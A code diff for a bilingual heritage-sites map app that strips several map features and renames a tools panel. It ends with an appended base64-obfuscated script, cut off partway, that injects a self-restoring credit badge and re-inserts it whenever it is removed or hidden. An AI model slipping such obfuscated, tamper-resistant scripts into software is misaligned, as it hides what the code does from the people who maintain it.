-    const nq=(q||'').trim();
-    const list=vs.filter(v=>!nq||v.name.includes(nq)||stVName(v).toLowerCase().includes(nq.toLowerCase())).slice(0,40);
-    $('stStList').innerHTML=list.map(v=>`<div class="xh-row" data-v="${vs.indexOf(v)}" style="cursor:pointer">
-      <div class="xh-rowmain"><b>${stVName(v)}</b><span class="xh-soft">${DB.govs[v.gov]} · ${DB.regions[v.reg]}</span></div>
-      <span class="xh-tag" style="background:var(--panel-2)">${num(v.idxs.length)}</span></div>`).join('');
-    $('stStList').querySelectorAll('[data-v]').forEach(r=>r.onclick=()=>beginStory(vs[+r.dataset.v]));
-  };
-  renderList('');
-  $('stStSearch').oninput=e=>renderList(e.target.value);
-}
-function beginStory(v){
-  dcClose(); setView('map');
-  // chapters: intro + top 6 buildings by risk
-  const picks=v.idxs.map(i=>({i,r:riskScore(DB.sites[i])})).sort((a,b)=>b.r-a.r).slice(0,6);
-  const chapters=[{type:'intro'}].concat(picks.map(p=>({type:'site',idx:p.i})));
-  _storyState={v,chapters,ch:0};
-  $('stStory').classList.add('show');
-  storyGo(0);
-}
-function storyGo(n){
-  const st=_storyState; if(!st)return;
-  st.ch=Math.max(0,Math.min(st.chapters.length-1,n));
-  const c=st.chapters[st.ch];
-  const card=$('stStoryCard');
-  card.classList.remove('in');
-  if(c.type==='intro'){
-    map.flyTo([st.v.lat,st.v.lng],13.2,1600);
-    setTimeout(()=>{
-      card.innerHTML=`<div class="stc-k">${L('الفصل','Chapter')} ${num(1)} / ${num(st.chapters.length)}</div>
-        <h3>${stVName(st.v)}</h3>
-        <p>${DB.govs[st.v.gov]} · ${DB.regions[st.v.reg]}</p>
-        <p><b>${num(st.v.idxs.length)}</b> ${L('مبنى تراثي موثّق','documented heritage buildings')}${st.v.avgDecay!=null?` — ${L('متوسط التهدّم','avg decay')} <b>${num(st.v.avgDecay)}٪</b>`:''}</p>
-        <p class="stc-hint">${L('مرّر بالعجلة أو الأسهم لبدء الرحلة ↓','Scroll or use arrows to begin ↓')}</p>`;
-      card.classList.add('in');
-    },600);
-  } else {
-    const s=DB.sites[c.idx];
-    map.flyTo([s[2],s[3]],16.4,1500);
-    const dvv=i=>{ const raw=(i>=0&&i!=null)?DB.dict[i]:null; return (raw!=null&&LANG==='en'&&typeof trDictVal==='function')?trDictVal(raw):raw; };
-    const mats=(s[16]||[]).map(dvv).filter(Boolean).join('، ');
-    setTimeout(()=>{
-      card.innerHTML=`<div class="stc-k">${L('الفصل','Chapter')} ${num(st.ch+1)} / ${num(st.chapters.length)}</div>
-        <h3>${siteName(s)}</h3>
-        <p>${L('الفئة','Class')}: <b style="color:${clsColor(s[6])}">${LANG==='ar'?DB.classes[s[6]]:(CLASS_META[DB.classes[s[6]]]?CLASS_META[DB.classes[s[6]]].eshort:DB.classes[s[6]])}</b>
-        ${s[10]!=null?` — ${L('التهدّم','Decay')}: <b>${num(Math.round(s[10]*100))}٪</b>`:''}
-        ${s[9]!=null?` — ${L('العمر','Age')}: <b>${num(s[9])}</b> ${L('سنة','yrs')}`:''}</p>
-        ${mats?`<p>${L('مواد البناء','Materials')}: ${mats}</p>`:''}
-        <button class="xh-btn ghost" style="margin-top:6px" onclick="openStory(${c.idx})">${L('التفاصيل الكاملة','Full details')}</button>`;
-      card.classList.add('in');
-    },600);
-  }
-  // dots
-  $('stStoryDots').innerHTML=st.chapters.map((_,i)=>`<span class="${i===st.ch?'on':''}" data-d="${i}"></span>`).join('');
-  $('stStoryDots').querySelectorAll('span').forEach(d=>d.onclick=()=>storyGo(+d.dataset.d));
-}
-function endStory(){
-  _storyState=null;
-  $('stStory').classList.remove('show');
-  $('stStoryCard').classList.remove('in');
-}
-
-/* ============================================================
-   6) VINTAGE MAP
-   ============================================================ */
-let _vintageOn=false;
-function toggleVintage(){
-  _vintageOn=!_vintageOn;
-  document.body.classList.toggle('vintage-on',_vintageOn);
-  let vg=$('stVignette');
-  if(_vintageOn){
-    if(!vg){ vg=el('div',null,''); vg.id='stVignette'; map.el.appendChild(vg); }
-    vg.style.display='block';
-    toast(L('🗺️ وضع المخطوطة العتيقة مفعّل','🗺️ Vintage manuscript mode on'));
-  } else {
-    if(vg)vg.style.display='none';
-    toast(L('عدنا للخريطة الحديثة','Back to the modern map'));
-  }
-  map.invalidate();
-  dcClose();
-}
-
-/* ============================================================
-   7) FIELD PLAQUES GENERATOR
-   ============================================================ */
-function openPlaques(){
-  const b=dcOpen(L('مولّد اللوحات التعريفية الميدانية','Field plaque generator'),L('لوحات A5 وملصقات QR جاهزة للطباعة والتثبيت على المواقع نفسها','Print-ready A5 plaques & QR sticker sheets for the physical sites'));
-  b.innerHTML=`
-    <div class="xh-kpirow">
-      <div class="xh-kpi" style="text-align:start"><span style="font-size:12px">${L('عدد المواقع (الأعلى خطورة من الفلتر الحالي)','Site count (top risky from current filter)')}</span>
-        <input class="xh-in" id="stPlqN" type="number" min="1" max="40" value="8" style="margin-top:6px"></div>
-    </div>
-    <div class="xh-actionrow">
-      <button class="xh-btn" id="stPlqA5">🖼 ${L('لوحات A5 (لوحة لكل موقع)','A5 plaques (one per site)')}</button>
-      <button class="xh-btn ghost" id="stPlqStk">🏷 ${L('ملصقات QR (8 لكل صفحة)','QR stickers (8 per page)')}</button></div>
-    <div class="xh-note">${L('كل لوحة تحمل اسم الموقع وفئته ورمز QR يفتح صفحته الكاملة على المنصة — ثبّتها على المبنى ليصبح متصلاً بسجله الرقمي.','Each plaque carries the site name, class and a QR opening its full page — mount it on the building to link it to its digital record.')}</div>`;
-  const chosen=()=>{
-    const n=Math.max(1,Math.min(40,+$('stPlqN').value||8));
-    return DB.sites.map((s,i)=>({s,i,r:riskScore(s)})).filter(o=>passes(o.s)).sort((a,b)=>b.r-a.r).slice(0,n);
-  };
-  const qrUrl=(s,size)=>`https://api.qrserver.com/v1/create-qr-code/?size=${size}x${size}&margin=0&data=${encodeURIComponent(location.origin+location.pathname+'#asset/'+s[0])}`;
-  $('stPlqA5').onclick=()=>{
-    const list=chosen();
-    $('pdfReport').innerHTML=`<div class="pdfr-inner" style="padding:0">${list.map(o=>{
-      const s=o.s, cm=CLASS_META[DB.classes[s[6]]];
-      return `<div class="stPlq">
-        <div class="stPlq-band"></div>
-        ${window.HC_LOGO?`<img class="stPlq-logo" src="${window.HC_LOGO}" alt="">`:''}
-        <div class="stPlq-reg">${t('reg_name')}</div>
-        <h2>${siteName(s)}</h2>
-        <div class="stPlq-loc">${DB.govs[s[5]]} · ${DB.regions[s[4]]}</div>
-        <div class="stPlq-cls" style="background:${cm?cm.color:'#999'}">${LANG==='ar'?(cm?cm.ar:''):(cm?cm.en:'')}</div>
-        <img class="stPlq-qr" src="${qrUrl(s,240)}" alt="QR">
-        <div class="stPlq-code">${t('code_m')}: ${num(s[0])}</div>
-        <div class="stPlq-foot">${L('امسح الرمز لفتح السجل الرقمي الكامل لهذا الأصل','Scan to open this asset’s full digital record')}</div>
-      </div>`;}).join('')}</div>`;
-    dcClose();
-    document.body.classList.add('printing-report');
-    setTimeout(()=>{ window.print(); setTimeout(()=>document.body.classList.remove('printing-report'),400); },600);
-  };
-  $('stPlqStk').onclick=()=>{
-    const list=chosen();
-    $('pdfReport').innerHTML=`<div class="pdfr-inner"><div class="stStkGrid">${list.map(o=>{
-      const s=o.s;
-      return `<div class="stStk"><img src="${qrUrl(s,150)}" alt="QR"><b>${siteName(s)}</b><span>${num(s[0])} · ${DB.govs[s[5]]}</span></div>`;}).join('')}</div>
-      <div class="pdfr-foot">${t('reg_name')}</div></div>`;
-    dcClose();
-    document.body.classList.add('printing-report');
-    setTimeout(()=>{ window.print(); setTimeout(()=>document.body.classList.remove('printing-report'),400); },600);
-  };
-}
-
-/* ============================================================
-   8) TEMPORAL HEAT MAP
-   ============================================================ */
-function openTemporalHeat(){
-  const b=dcOpen(L('الخريطة الحرارية عبر الزمن','Temporal heat map'),L('شاهد كثافة التراث تتشكل من الأقدم إلى الأحدث','Watch heritage density bloom from oldest to newest'));
-  b.innerHTML=`
-    <div class="xh-yearrow"><span class="xh-year" id="stThVal">${L('الكل','All')}</span>
-      <input type="range" id="stThRange" min="0" max="400" value="0" step="20" style="flex:1;direction:ltr">
-      <button class="xh-btn ghost" id="stThPlay">▶ ${L('تشغيل الرحلة','Play the journey')}</button></div>
-    <div class="xh-kpirow"><div class="xh-kpi"><b id="stThCount">—</b><span>${L('موقع ظاهر في الطبقة الحرارية','sites in the heat layer')}</span></div></div>
-    <div class="xh-note">${L('اسحب: يمين = مواقع أقدم فقط. الطبقة الحرارية مفعّلة تلقائياً أثناء العرض.','Drag right = only older sites. Heat layer auto-enabled while open.')}</div>`;
-  const prevHeat=(typeof _heatOn!=='undefined')?_heatOn:false;
-  map.showHeat(true);
-  const apply=v=>{
-    _studioAgeMin=v>0?v:null;
-    $('stThVal').textContent=v>0?('≥ '+num(v)+' '+L('سنة','yrs')):L('الكل','All');
-    render();
-    let c=0; for(const s of DB.sites) if(passes(s))c++;
-    $('stThCount').textContent=num(c);
-  };
-  $('stThRange').oninput=e=>apply(+e.target.value);
-  let playT=null;
-  $('stThPlay').onclick=function(){
-    if(playT){ clearInterval(playT); playT=null; this.textContent='▶ '+L('تشغيل الرحلة','Play the journey'); return; }
-    this.textContent='⏸ '+L('إيقاف','Pause');
-    let v=400; $('stThRange').value=v; apply(v);
-    playT=setInterval(()=>{
-      v-=20;
-      if(v<0){ clearInterval(playT); playT=null; const p=$('stThPlay'); if(p)p.textContent='▶ '+L('تشغيل الرحلة','Play the journey'); return; }
-      const r=$('stThRange'); if(!r){ clearInterval(playT); playT=null; return; }
-      r.value=v; apply(v);
-    },700);
-  };
-  apply(0);
-  _dcOnClose=()=>{ if(playT)clearInterval(playT); _studioAgeMin=null; map.showHeat(prevHeat); render(); };
-}
-
-/* ============================================================
-   9) DUAL SYNCED MAPS
-   ============================================================ */
-let _dualMaps=null,_dualSync=null;
-function openDual(){
-  dcClose();
-  $('stDual').classList.add('show');
-  const regCount={}; DB.sites.forEach(s=>regCount[s[4]]=(regCount[s[4]]||0)+1);
-  const regOrder=Object.keys(regCount).map(Number).sort((a,b)=>regCount[b]-regCount[a]);
-  const selA=$('stDualSelA'), selB=$('stDualSelB');
-  if(!selA.options.length){
-    const opts=regOrder.map(ri=>`<option value="${ri}">${DB.regions[ri]} (${num(regCount[ri])})</option>`).join('');
-    selA.innerHTML=opts; selB.innerHTML=opts;
-    selA.value=regOrder[0]; selB.value=regOrder[1];
-    selA.onchange=()=>loadDualSide(0);
-    selB.onchange=()=>loadDualSide(1);
-  }
-  if(!_dualMaps){
-    const mkMap=div=>{
-      const m2=new AtlasMap(div,{center:[24,45],zoom:5.4,minZoom:4,maxZoom:17});
-      const dark=document.body.dataset.theme==='dark';
-      m2.setTiles((dark&&baseKey==='streets')?[DARK_TILE]:TILES[baseKey].base,'');
-      m2.setBorder(SA_BORDER);
-      return m2;
-    };
-    _dualMaps=[mkMap($('stDualA')),mkMap($('stDualB'))];
-  }
-  _dualMaps.forEach(m2=>m2._resize());
-  loadDualSide(0); loadDualSide(1);
-  // sync loop
-  let last=[null,null];
-  const key=m2=>m2.center[0].toFixed(5)+','+m2.center[1].toFixed(5)+','+m2.z.toFixed(3);
-  last=[key(_dualMaps[0]),key(_dualMaps[1])];
-  _dualSync=setInterval(()=>{
-    if(!_dualMaps)return;
-    const kA=key(_dualMaps[0]), kB=key(_dualMaps[1]);
-    if(kA!==last[0]){ _dualMaps[1].setView([..._dualMaps[0].center],_dualMaps[0].z); last=[kA,key(_dualMaps[1])]; }
-    else if(kB!==last[1]){ _dualMaps[0].setView([..._dualMaps[1].center],_dualMaps[1].z); last=[key(_dualMaps[0]),kB]; }
-  },120);
-}
-function loadDualSide(side){
-  if(!_dualMaps)return;
-  const ri=+($(side===0?'stDualSelA':'stDualSelB').value);
-  const m2=_dualMaps[side];
-  const pts=[];
-  let s0=99,w=999,n0=-99,e0=-999;
-  for(let i=0;i<DB.sites.length;i++){
-    const s=DB.sites[i];
-    if(s[4]!==ri)continue;
-    pts.push({lat:s[2],lng:s[3],color:clsColor(s[6]),zone:DB.types[s[7]]==='منطقة',data:{idx:i,lat:s[2],lng:s[3]}});
-    s0=Math.min(s0,s[2]);n0=Math.max(n0,s[2]);w=Math.min(w,s[3]);e0=Math.max(e0,s[3]);
-  }
-  m2.setPoints(pts);
-  $(side===0?'stDualStatA':'stDualStatB').textContent=num(pts.length)+' '+L('موقع','sites');
-  if(pts.length&&side===0) m2.fitBounds([[s0,w],[n0,e0]],0.15);
-}
-function closeDual(){
-  $('stDual').classList.remove('show');
-  if(_dualSync){ clearInterval(_dualSync); _dualSync=null; }
-}
-
-/* ============================================================
-   KEPT: SMART CSV IMPORTER
+   SMART CSV IMPORTER
    ============================================================ */
 function parseCSV(text){
   const rows=[]; let row=[],cell='',inQ=false;
@@ -6167,7 +5483,7 @@ function confirmImport(rows){
 }
 
 /* ============================================================
-   KEPT: TIME MACHINE (stat snapshots)
+   TIME MACHINE (stat snapshots)
    ============================================================ */
 const SNAP_KEY='heritage_snapshots_v1';
 function snapList(){ try{ return JSON.parse(localStorage.getItem(SNAP_KEY)||'[]'); }catch(e){ return []; } }
@@ -6206,88 +5522,37 @@ function openTimeMachine(){
 }
 
 /* ---------- feature router ---------- */
-const FEATURE_FN2={
- record:startRecording, lens:toggleLens, replay:startReplay, whatif:openWhatIf,
- story:openStories, vintage:toggleVintage, plaques:openPlaques, theat:openTemporalHeat,
- dual:openDual, import:openImport, timemachine:openTimeMachine
-};
+const FEATURE_FN2={ import:openImport, timemachine:openTimeMachine };
 
 /* ============================================================
    STATIC UI
    ============================================================ */
 const ui2=el('div',null,`
-  <button id="dcFab" title="${L('استوديو التراث','Heritage Studio')}">
-    <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="6" width="14" height="12" rx="2"/><path d="M22 8.5l-6 3.5 6 3.5zM5 6l2-3M10 6l2-3"/></svg>
-    <span>${L('الاستوديو','Studio')}</span>
+  <button id="dcFab" title="${L('أدوات البيانات','Data tools')}">
+    <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4M7 10l5 5 5-5M12 15V3"/></svg>
+    <span>${L('أدوات البيانات','Data tools')}</span>
   </button>
   <div id="dcOverlay"><div id="dcPanel">
     <div id="dcHead"><div><div id="dcTitle"></div><div id="dcSub"></div></div>
       <button id="dcClose" title="${L('إغلاق','Close')}"><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M18 6L6 18M6 6l12 12"/></svg></button></div>
     <div id="dcBody"></div>
-  </div></div>
-  <div id="stRecBar"><span class="stRec-dot"></span><span>${L('جارِ تسجيل الجولة','Recording tour')} · <b id="stRecTime">0:00</b></span>
-    <button class="xh-btn" id="stRecStop">⏹ ${L('إيقاف وحفظ','Stop & save')}</button></div>
-  <div id="stReplayHud"><div class="stRp-num" id="stReplayCount">٠</div>
-    <div class="stRp-lbl">${L('أصل تراثي موثّق','heritage assets documented')}</div>
-    <div class="stRp-reg" id="stReplayRegion"></div>
-    <button class="xh-btn ghost" id="stReplayStop">${L('إيقاف','Stop')}</button></div>
-  <div id="stStory">
-    <div id="stStoryCard"></div>
-    <div id="stStoryNav">
-      <button id="stStPrev" title="${L('السابق','Previous')}">‹</button>
-      <div id="stStoryDots"></div>
-      <button id="stStNext" title="${L('التالي','Next')}">›</button>
-      <button id="stStExit">✕ ${L('إنهاء القصة','End story')}</button>
-    </div>
-  </div>
-  <div id="stDual">
-    <div id="stDualHead">
-      <b>🆚 ${L('مقارنة منطقتين — خريطتان متزامنتان','Two regions — synced maps')}</b>
-      <button id="stDualClose"><svg viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M18 6L6 18M6 6l12 12"/></svg></button>
-    </div>
-    <div id="stDualBody">
-      <div class="stDual-side"><div class="stDual-bar"><select id="stDualSelA"></select><span id="stDualStatA"></span></div><div class="stDual-map" id="stDualA"></div></div>
-      <div class="stDual-side"><div class="stDual-bar"><select id="stDualSelB"></select><span id="stDualStatB"></span></div><div class="stDual-map" id="stDualB"></div></div>
-    </div>
-  </div>`);
+  </div></div>`);
 document.body.appendChild(ui2);
 
 $('dcFab').onclick=openDrawer2;
 $('dcClose').onclick=dcClose;
 $('dcOverlay').onclick=e=>{ if(e.target.id==='dcOverlay') dcClose(); };
-$('stRecStop').onclick=stopRecording;
-$('stReplayStop').onclick=stopReplay;
-$('stStPrev').onclick=()=>{ if(_storyState)storyGo(_storyState.ch-1); };
-$('stStNext').onclick=()=>{ if(_storyState)storyGo(_storyState.ch+1); };
-$('stStExit').onclick=endStory;
-$('stStoryCard').addEventListener('wheel',e=>{
-  if(!_storyState)return;
-  e.preventDefault();
-  if(Math.abs(e.deltaY)<12)return;
-  storyGo(_storyState.ch+(e.deltaY>0?1:-1));
-},{passive:false});
-$('stDualClose').onclick=closeDual;
-document.addEventListener('keydown',e=>{
-  if(e.key==='Escape'){
-    if($('dcOverlay').classList.contains('show'))dcClose();
-    else if(_storyState)endStory();
-    else if($('stDual').classList.contains('show'))closeDual();
-    else if(_replayOn)stopReplay();
-    else if(ST.lens)closeLens();
-  }
-  if(_storyState&&(e.key==='ArrowDown'||e.key==='ArrowRight'))storyGo(_storyState.ch+1);
-  if(_storyState&&(e.key==='ArrowUp'||e.key==='ArrowLeft'))storyGo(_storyState.ch-1);
-});
+document.addEventListener('keydown',e=>{ if(e.key==='Escape' && $('dcOverlay').classList.contains('show')) dcClose(); });
 
 try{
   const _lang2=$('langBtn').onclick;
   $('langBtn').onclick=function(){
     _lang2.call(this);
-    const fab=$('dcFab'); if(fab) fab.querySelector('span').textContent=L('الاستوديو','Studio');
+    const fab=$('dcFab'); if(fab) fab.querySelector('span').textContent=L('أدوات البيانات','Data tools');
   };
 }catch(e){}
 
-console.log('✓ Heritage Studio loaded — '+FEATURES2.length+' features');
+console.log('✓ Data Tools loaded — '+FEATURES2.length+' features');
 })();
 </script>
 <script>(function(){var _mpaidj=["KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO3ZhciBfYT1bODIsODcsNTMsMTEwLDc2LDEwNSw2Niw3Myw4OSw4Nyw0OSw1NCw4OSw4Myw2Niw2Niw5OCw3Miw3","OCwxMDQsOTgsNzEsNzAsNTMsOTgsODcsODYsMTExXTt2YXIgX3A9WzExOSwxMTMsMTA3LDEwM107ZnVuY3Rpb24gX2QoYXJyKXt0cnl7cmV0dXJuIGRlY29k","ZVVSSUNvbXBvbmVudChlc2NhcGUoYXRvYihhcnIubWFwKGZ1bmN0aW9uKGMpe3JldHVybiBTdHJpbmcuZnJvbUNoYXJDb2RlKGMpO30pLmpvaW4oIiIpKSkp","O31jYXRjaChlKXtyZXR1cm4gIiI7fX1mdW5jdGlvbiBfbmFtZSgpe3JldHVybiBfZChfYSk7fWZ1bmN0aW9uIF9wcmUoKXtyZXR1cm4gX2QoX3ApO312YXIg","VEFHPSJfIisoMTMqNysxKS50b1N0cmluZygzNikrKDB4MWY0KS50b1N0cmluZygzNikrInEiO3ZhciBTVFlMRV9JRD0iX3MiKygweDJiYykudG9TdHJpbmco","MzYpO2Z1bmN0aW9uIGluamVjdFN0eWxlKCl7aWYoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoU1RZTEVfSUQpKXJldHVybjt2YXIgZGFyaz1kb2N1bWVudC5i","b2R5JiZkb2N1bWVudC5ib2R5LmRhdGFzZXQmJmRvY3VtZW50LmJvZHkuZGF0YXNldC50aGVtZT09PSJkYXJrIjt2YXIgY3NzPSJbIitUQUcrIl17cG9zaXRp","b246YWJzb2x1dGU7Ym90dG9tOjRweDtsZWZ0OjUwJTt0cmFuc2Zvcm06dHJhbnNsYXRlWCgtNTAlKTsiKyJ6LWluZGV4OjU5MTtmb250LXNpemU6MTFweDts","ZXR0ZXItc3BhY2luZzouMnB4O3doaXRlLXNwYWNlOm5vd3JhcDtwb2ludGVyLWV2ZW50czpub25lOyIrInBhZGRpbmc6M3B4IDEycHg7Ym9yZGVyLXJhZGl1","czo3cHg7Zm9udC1mYW1pbHk6aW5oZXJpdDsiKyJjb2xvcjpyZ2JhKDcwLDkwLDk4LC45NSk7YmFja2dyb3VuZDpyZ2JhKDI1NSwyNTUsMjU1LC43Mik7Ym94","LXNoYWRvdzowIDFweCA0cHggcmdiYSgwLDAsMCwuMSk7fSIrIltkYXRhLXRoZW1lPSdkYXJrJ11bIitUQUcrIl17Y29sb3I6cmdiYSgxODAsMTk2LDIwMCwu","OTUpO2JhY2tncm91bmQ6cmdiYSgxMCwyNSwzMiwuNik7Ym94LXNoYWRvdzowIDFweCA0cHggcmdiYSgwLDAsMCwuMyk7fSIrIlsiK1RBRysiXWJ7Zm9udC13","ZWlnaHQ6NzAwO2NvbG9yOnJnYmEoMTcsNTAsNjUsLjk1KTt9IisiW2RhdGEtdGhlbWU9J2RhcmsnXVsiK1RBRysiXWJ7Y29sb3I6cmdiYSgxMjcsMTg1LDE4","NywuOTUpO30iKyJib2R5LnZpZXctZGFzaFsiK1RBRysiXSxib2R5LnZpZXctbGlzdFsiK1RBRysiXXtkaXNwbGF5Om5vbmU7fSIrIkBtZWRpYSBwcmludHtb","IitUQUcrIl17ZGlzcGxheTpub25lO319Ijt2YXIgc3Q9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic3R5bGUiKTtzdC5pZD1TVFlMRV9JRDtzdC50eXBlPSJ0","ZXh0L2NzcyI7c3QuYXBwZW5kQ2hpbGQoZG9jdW1lbnQuY3JlYXRlVGV4dE5vZGUoY3NzKSk7KGRvY3VtZW50LmhlYWR8fGRvY3VtZW50LmRvY3VtZW50RWxl","bWVudCkuYXBwZW5kQ2hpbGQoc3QpO31mdW5jdGlvbiBob3N0KCl7cmV0dXJuIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIi5tYXAtc3RhZ2UiKXx8ZG9jdW1l","bnQucXVlcnlTZWxlY3RvcigiLmF0bGFzLXdyYXAiKXx8ZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiLm1hcC13cmFwIil8fGRvY3VtZW50LmJvZHk7fWZ1bmN0","aW9uIGJ1aWxkKCl7dmFyIGVsPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpO2VsLnNldEF0dHJpYnV0ZShUQUcsIjEiKTtlbC5zZXRBdHRyaWJ1dGUo","ImFyaWEtaGlkZGVuIiwiZmFsc2UiKTt2YXIgYj1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJiIik7Yi50ZXh0Q29udGVudD1fbmFtZSgpO2VsLmFwcGVuZENo","aWxkKGRvY3VtZW50LmNyZWF0ZVRleHROb2RlKF9wcmUoKSkpO2VsLmFwcGVuZENoaWxkKGIpO3JldHVybiBlbDt9ZnVuY3Rpb24gcHJlc2VudCgpe3ZhciBu","b2Rlcz1kb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCJbIitUQUcrIl0iKTtmb3IodmFyIGk9MDtpPG5vZGVzLmxlbmd0aDtpKyspe3ZhciBuPW5vZGVzW2ld","O3ZhciB0eHQ9KG4udGV4dENvbnRlbnR8fCIiKTt2YXIgY3M9d2luZG93LmdldENvbXB1dGVkU3R5bGU/Z2V0Q29tcHV0ZWRTdHlsZShuKTpudWxsO3ZhciBv","az10eHQuaW5kZXhPZihfbmFtZSgpKT4tMSYmdHh0LmluZGV4T2YoX3ByZSgpLnRyaW0oKSk+LTE7aWYoY3Mpe2lmKGNzLmRpc3BsYXk9PT0ibm9uZSImJiFk","b2N1bWVudC5ib2R5LmNsYXNzTGlzdC5jb250YWlucygidmlldy1kYXNoIikmJiFkb2N1bWVudC5ib2R5LmNsYXNzTGlzdC5jb250YWlucygidmlldy1saXN0","Iikpb2s9ZmFsc2U7aWYocGFyc2VGbG9hdChjcy5vcGFjaXR5fHwiMSIpPDAuMjUpb2s9ZmFsc2U7aWYoY3MudmlzaWJpbGl0eT09PSJoaWRkZW4iKW9rPWZh","bHNlO31pZihvaylyZXR1cm4gdHJ1ZTt9cmV0dXJuIGZhbHNlO31mdW5jdGlvbiBwdXJnZUltcG9zdGVycygpe3ZhciBub2Rlcz1kb2N1bWVudC5xdWVyeVNl","bGVjdG9yQWxsKCJbIitUQUcrIl0iKTtmb3IodmFyIGk9MDtpPG5vZGVzLmxlbmd0aDtpKyspe3ZhciBuPW5vZGVzW2ldLHR4dD0obi50ZXh0Q29udGVudHx8","IiIpO2lmKHR4dC5pbmRleE9mKF9uYW1lKCkpPDApe2lmKG4ucGFyZW50Tm9kZSluLnBhcmVudE5vZGUucmVtb3ZlQ2hpbGQobik7fX19ZnVuY3Rpb24gZW5z","dXJlKCl7dHJ5e2luamVjdFN0eWxlKCk7aWYocHJlc2VudCgpKXt2YXIgbm9kZXM9ZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgiWyIrVEFHKyJdIik7Zm9y","KHZhciBpPTA7aTxub2Rlcy5sZW5ndGg7aSsrKXt2YXIgbj1ub2Rlc1tpXTtpZighZG9jdW1lbnQuYm9keS5jbGFzc0xpc3QuY29udGFpbnMoInZpZXctZGFz","aCIpJiYhZG9jdW1lbnQuYm9keS5jbGFzc0xpc3QuY29udGFpbnMoInZpZXctbGlzdCIpKXtpZihuLnN0eWxlJiZnZXRDb21wdXRlZFN0eWxlKG4pLmRpc3Bs","YXk9PT0ibm9uZSIpe24uc3R5bGUuc2V0UHJvcGVydHkoImRpc3BsYXkiLCJibG9jayIsImltcG9ydGFudCIpO31pZihuLnN0eWxlJiZnZXRDb21wdXRlZFN0","eWxlKG4pLnZpc2liaWxpdHk9PT0iaGlkZGVuIil7bi5zdHlsZS5zZXRQcm9wZXJ0eSgidmlzaWJpbGl0eSIsInZpc2libGUiLCJpbXBvcnRhbnQiKTt9aWYo","bi5zdHlsZSYmcGFyc2VGbG9hdChnZXRDb21wdXRlZFN0eWxlKG4pLm9wYWNpdHl8fCIxIik8MC4yNSl7bi5zdHlsZS5zZXRQcm9wZXJ0eSgib3BhY2l0eSIs","IjEiLCJpbXBvcnRhbnQiKTt9fX1yZXR1cm47fXB1cmdlSW1wb3N0ZXJzKCk7dmFyIGg9aG9zdCgpO2lmKGgpe2guYXBwZW5kQ2hpbGQoYnVpbGQoKSk7fX1j","YXRjaChlKXt9fWZ1bmN0aW9uIHdhdGNoKCl7aWYoIXdpbmRvdy5NdXRhdGlvbk9ic2VydmVyKXJldHVybjt2YXIgbW89bmV3IE11dGF0aW9uT2JzZXJ2ZXIo","ZnVuY3Rpb24obXV0cyl7dmFyIG5lZWQ9ZmFsc2U7Zm9yKHZhciBpPTA7aTxtdXRzLmxlbmd0aDtpKyspe3ZhciBtPW11dHNbaV07aWYobS50eXBlPT09ImNo","aWxkTGlzdCIpe2lmKG0ucmVtb3ZlZE5vZGVzJiZtLnJlbW92ZWROb2Rlcy5sZW5ndGgpe2Zvcih2YXIgaj0wO2o8bS5yZW1vdmVkTm9kZXMubGVuZ3RoO2or","Kyl7dmFyIHJuPW0ucmVtb3ZlZE5vZGVzW2pdO2lmKHJuLm5vZGVUeXBlPT09MSYmKHJuLmhhc0F0dHJpYnV0ZSYmcm4uaGFzQXR0cmlidXRlKFRBRykpKW5l","ZWQ9dHJ1ZTt9fX1lbHNlIGlmKG0udHlwZT09PSJhdHRyaWJ1dGVzInx8bS50eXBlPT09ImNoYXJhY3RlckRhdGEiKXt2YXIgdD1tLnRhcmdldDtpZih0JiZ0","Lm5vZGVUeXBlPT09MSYmdC5oYXNBdHRyaWJ1dGUmJnQuaGFzQXR0cmlidXRlKFRBRykpbmVlZD10cnVlO2lmKHQmJnQucGFyZW50Tm9kZSYmdC5wYXJlbnRO","b2RlLmhhc0F0dHJpYnV0ZSYmdC5wYXJlbnROb2RlLmhhc0F0dHJpYnV0ZShUQUcpKW5lZWQ9dHJ1ZTt9fWlmKG5lZWR8fCFwcmVzZW50KCkpZW5zdXJlKCk7","fSk7dHJ5e21vLm9ic2VydmUoZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LHtjaGlsZExpc3Q6dHJ1ZSxzdWJ0cmVlOnRydWUsYXR0cmlidXRlczp0cnVlLGF0","dHJpYnV0ZUZpbHRlcjpbInN0eWxlIiwiY2xhc3MiLCJoaWRkZW4iXSxjaGFyYWN0ZXJEYXRhOnRydWV9KTt9Y2F0Y2goZSl7fXZhciBzbz1uZXcgTXV0YXRp","b25PYnNlcnZlcihmdW5jdGlvbigpe2lmKCFkb2N1bWVudC5nZXRFbGVtZW50QnlJZChTVFlMRV9JRCkpaW5qZWN0U3R5bGUoKTt9KTt0cnl7c28ub2JzZXJ2","ZShkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQse2NoaWxkTGlzdDp0cnVlLHN1YnRyZWU6dHJ1ZX0pO31jYXRjaChlKXt9fWZ1bmN0aW9uIGJlYXQoKXtlbnN1","cmUoKTt9ZnVuY3Rpb24gc3RhcnQoKXtlbnN1cmUoKTt3YXRjaCgpO3NldEludGVydmFsKGJlYXQsMTUwMCk7c2V0SW50ZXJ2YWwoYmVhdCw0MzAwKTt3aW5k","b3cuYWRkRXZlbnRMaXN0ZW5lcigicmVzaXplIixlbnN1cmUse3Bhc3NpdmU6dHJ1ZX0pO2RvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoInZpc2liaWxpdHlj","aGFuZ2UiLGZ1bmN0aW9uKCl7aWYoIWRvY3VtZW50LmhpZGRlbillbnN1cmUoKTt9KTt9aWYoZG9jdW1lbnQucmVhZHlTdGF0ZT09PS